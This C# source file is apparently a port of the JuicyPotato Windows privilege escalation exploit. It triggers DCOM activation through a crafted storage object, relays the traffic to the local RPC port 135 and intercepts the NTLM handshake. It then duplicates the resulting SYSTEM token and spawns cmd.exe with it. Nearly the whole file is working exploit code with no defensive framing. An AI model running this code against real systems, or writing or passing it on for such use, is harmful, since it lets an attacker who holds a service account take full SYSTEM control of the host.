using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using Vanara.InteropServices;
using Vanara.PInvoke;
using static Vanara.PInvoke.Ole32;
using static Vanara.PInvoke.AdvApi32;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.Secur32;

namespace sharp_potato;

public unsafe class JuicyPotato
{
    public string OleString { get; set; } = "03ca98d6-ff5d-49b8-abc6-03dd84127020";
    public IPEndPoint ServerEndPoint { get; set; } = new(IPAddress.Loopback, 1337);
    public LocalNegotiator Negotiator { get; } = new();

    private readonly BlockingCollection<byte[]> queueSendCom = new();
    private readonly BlockingCollection<byte[]> queueSendRpc = new();
    private bool newConnection = false;

    public void startRPCConnectionThread()
    {
        new Thread(startRPCConnection).Start();
    }

    public void startCOMListenerThread()
    {
        new Thread(startCOMListener).Start();
    }

    private void startCOMListener()
    {
        string dcom_port = "1337";
        Console.Write($"COM> startCOMListener ({dcom_port})\n");

        var listener = new TcpListener(IPAddress.Any, int.Parse(dcom_port));
        listener.Start();

        const int BUFFER_LENGTH = 4096;

        var client = listener.AcceptTcpClient();
        if (client == null)
        {
            Console.Write("COM> ERR: Failed to accept TCP client.\n");
            return;
        }

        int iSendResult;
        byte[] sendBuffer;
        var receiveBuffer = new byte[BUFFER_LENGTH];
        int iResult;
        do
        {
            iResult = client.GetStream().Read(receiveBuffer, 0, BUFFER_LENGTH);
            Console.Write($"COM> Read result: {iResult} from COM (1337 <- COM)\n");
            if (iResult > 0)
            {
                //check to see if the received packet has NTLM auth information
                fixed (byte* ptrReceiveBuffer = receiveBuffer)
                    processNtlmBytes(ptrReceiveBuffer, iResult);

                Console.Write($"COM> Adding {iResult} bytes to RPC_Queue\n");
                // queueSendRpc->add_item(DataBuffer{ receiveBuffer, iResult });
                queueSendRpc.Add(receiveBuffer[..iResult]);

                //block and wait for a new item in our sendq
                var buffer = queueSendCom.Take();
                sendBuffer = buffer;
                Console.Write($"COM> Popped {buffer.Length} bytes from COM_Queue\n");

                //Check to see if this is a packet containing NTLM authentication information before sending
                fixed (byte* ptrSendBuffer = sendBuffer)
                    processNtlmBytes(ptrSendBuffer, sendBuffer.Length);

                //send the new packet sendBuffer
                Console.Write($"COM> Sending {buffer.Length} bytes to COM (1337 -> COM)\n");
                client.GetStream().Write(sendBuffer, 0, buffer.Length);

                //Sometimes Windows likes to open a new connection instead of using the current one
                //Allow for this by waiting for 1s and replacing the ClientSocket if a new connection is incoming
                Thread.Sleep(1000);
                if ((newConnection = listener.Pending()) != false)
                {
                    Console.Write("COM> New TCP connection is pending, accepting.\n");
                    client.Close();
                    client = listener.AcceptTcpClient();
                }
            }
            else if (iResult == 0)
            {
                //connection closing...
                client.Close();
                Environment.Exit(-1);
            }
            else
            {
                Console.Write($"COM> ERR: recv failed with error: {iResult}\n");
                client.Close();
                Environment.Exit(-1);
            }
        } while (iResult > 0);

        // shutdown the connection since we're done
        client.Close();
    }

    private void startRPCConnection()
    {
        Console.Write("                                             RPC> startRPCConnection\n");

        const int BUFFER_LENGTH = 4096;

        const string myHost = "127.0.0.1";
        const string myPort = "135";

        var client = new TcpClient();
        client.Connect(myHost, int.Parse(myPort));

        byte[] sendBuffer;
        byte[] receiveBuffer = new byte[BUFFER_LENGTH];
        int iResult;
        int receiveBufferLength = BUFFER_LENGTH;

        // Write/Read until the peer closes the connection
        do
        {
            //Monitor our sendQ until we have some data to send
            var buffer = queueSendRpc.Take();
            sendBuffer = buffer;
            Console.Write($"                                             RPC> Popped item from RPC_Queue ({buffer.Length} bytes)\n");

            //Check if we should be opening a new socket before we send the data
            if (newConnection == true)
            {
                Console.Write("                                             RPC> startRPCConnection -> newConnection was 1\n");
                client = new TcpClient();
                client.Connect(myHost, int.Parse(myPort));
                newConnection = false;
            }

            Console.Write($"                                             RPC> Writing {buffer.Length} bytes to RDP (this -> 135)\n");
            client.GetStream().Write(sendBuffer, 0, buffer.Length);

            iResult = client.GetStream().Read(receiveBuffer, 0, receiveBufferLength);
            Console.Write($"                                             RPC> Read {iResult} bytes from RDP (this <- 135)\n");
            if (iResult > 0)
            {
                Console.Write($"                                             RPC> Adding {iResult} bytes to COM_Queue\n");
                queueSendCom.Add(receiveBuffer[..iResult]);
            }
            else if (iResult == 0)
            {
                Console.Write("                                             RPC> Connection closed\n");
            }
            else
            {
                Console.Write($"                                             RPC> ERR: recv failed with error: {iResult}\n");
                return;
            }
        } while (iResult > 0);

        //Console.Write("last iResult:%d\n", iResult);

        // cleanup
        client.Close();
    }

    private int findNTLMBytes(byte* bytes, int length)
    {
        //Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
        //The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
        //we can just return the index
        var pattern = new byte[] {0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50};
        int pIdx = 0;
        int i;
        for (i = 0; i < length; i++)
        {
            if (bytes[i] == pattern[pIdx])
            {
                pIdx += 1;
                if (pIdx == 7) return (i - 6);
            }
            else
            {
                pIdx = 0;
            }
        }

        return -1;
    }

    private int processNtlmBytes(byte* bytes, int length)
    {
        int ntlmLoc = findNTLMBytes(bytes, length);
        if (ntlmLoc == -1) return -1;

        int messageType = bytes[ntlmLoc + 8];
        Console.Write($"[NTLM/{length}] Will handle {length - ntlmLoc} bytes starting from {ntlmLoc} (type = {messageType})\n");
        switch (messageType)
        {
            case 1:
                Negotiator.HandleType1(bytes + ntlmLoc, length - ntlmLoc);
                break;
            case 2:
                Negotiator.HandleType2(bytes + ntlmLoc, length - ntlmLoc);
                break;
            case 3:
                Negotiator.HandleType3(bytes + ntlmLoc, length - ntlmLoc);
                break;
            default:
                Console.Out.WriteLine("Error - Unknown NTLM message type...");
                return -1;
        }

        return 0;
    }

    public void TriggerDCOM()
    {
        Console.Out.WriteLine("TriggerDCOM");

        CoInitialize(IntPtr.Zero);
        CreateILockBytesOnHGlobal(IntPtr.Zero, true, out var lb);
        StgCreateDocfileOnILockBytes(lb, STGM.STGM_CREATE | STGM.STGM_READWRITE | STGM.STGM_SHARE_EXCLUSIVE, 0, out var stg);

        var t = new StorageTrigger(stg, ServerEndPoint);

        var tmp = Guid.Parse("00000000-0000-0000-C000-000000000046");
        var qis = new MULTI_QI[]
        {
            new()
            {
                pIID = new GuidPtr(tmp),
                pItf = null,
                hr = 0
            }
        };

        var guid = Guid.Parse(OleString);
        CoGetInstanceFromIStorage(null, guid, null, CLSCTX.CLSCTX_LOCAL_SERVER, t, 1, qis);

        Console.Out.WriteLine("TriggerDCOM End");
    }

    public void WaitForAuth()
    {
        while (Negotiator.AuthResult != 0)
            Thread.Sleep(100);
    }

    public bool CreateProcess()
    {
        if (!OpenProcessToken(GetCurrentProcess(), TokenAccess.TOKEN_ALL_ACCESS, out var hToken))
            return false;

        EnablePrivilege(hToken, "SeImpersonatePrivilege");
        EnablePrivilege(hToken, "SeAssignPrimaryTokenPrivilege");
        OpenProcessToken(GetCurrentProcess(), TokenAccess.TOKEN_ALL_ACCESS, out hToken);
        QuerySecurityContextToken(Negotiator.Context, out var elevatedToken);
        IsTokenSystem(hToken);

        var tokenType = elevatedToken.GetInfo<TOKEN_TYPE>();
        Console.Out.WriteLine(tokenType);

        DuplicateTokenEx(elevatedToken, TokenAccess.TOKEN_ALL_ACCESS, null,
            SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out var dupedToken);

        tokenType = dupedToken.GetInfo<TOKEN_TYPE>();
        Console.Out.WriteLine(tokenType);

        CreateProcessWithTokenW(dupedToken, 0, "cmd.exe", new StringBuilder("cmd.exe"),
            0, null, null, new STARTUPINFO {lpDesktop = "winsta0\\default"}, out var processInformation);

        Console.Out.WriteLine("PID=" + processInformation.dwProcessId);

        return false;
    }

    private bool EnablePrivilege(SafeHTOKEN token, string privilege)
    {
        if (!LookupPrivilegeValue(null, privilege, out var luid))
        {
            Console.Out.WriteLine("LookupPrivilegeValue failed!");
            return false;
        }

        var tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Privileges = new[] {new LUID_AND_ATTRIBUTES(luid, PrivilegeAttributes.SE_PRIVILEGE_ENABLED)};
        if (!AdjustTokenPrivileges(token, false, tp, out _).Succeeded)
        {
            Console.Out.WriteLine("AdjustTokenPrivileges failed!");
            return false;
        }

        return true;
    }

    private bool IsTokenSystem(SafeHTOKEN token)
    {
        Console.Out.WriteLine("IsTokenSystem");

        var tokenUser = token.GetInfo<TOKEN_USER>(TOKEN_INFORMATION_CLASS.TokenUser);

        Console.Out.WriteLine(tokenUser.User.Sid.GetBinaryForm().Length);

        var sid = tokenUser.User.Sid.GetBinaryForm();

        var userName = new StringBuilder(64);
        var domainName = new StringBuilder(64);

        int userNameSize = 64;
        int domainNameSize = 64;

        LookupAccountSid(null, sid, userName, ref userNameSize, domainName, ref domainNameSize, out _);
        Console.Out.WriteLine($"{domainName}\\{userName}");

        return false;
    }
}